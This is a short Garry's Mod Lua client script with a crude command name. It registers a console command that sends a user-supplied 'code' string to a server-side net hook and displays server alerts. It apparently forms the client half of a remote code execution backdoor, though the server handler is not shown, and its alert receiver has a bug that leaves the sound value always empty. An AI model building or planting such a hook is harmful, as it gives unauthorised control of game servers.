if CLIENT then

concommand.Add("sex", function(ply, cmd, args)
	local code = args[1]
	if code then
		if string.len(code) <= 65532 then
			net.Start( "THESEXHOOK" )
			net.WriteString( code )
			net.SendToServer()
		end
	else
		net.Start( "THESEXHOOK" )
		net.SendToServer()
	end
end)

net.Receive( "SexAlertClient", function()
	local message, sound = net.ReadString()
	if sound then
		surface.PlaySound( sound )
	end
	LocalPlayer():PrintMessage( HUD_PRINTCENTER, message )
end )

end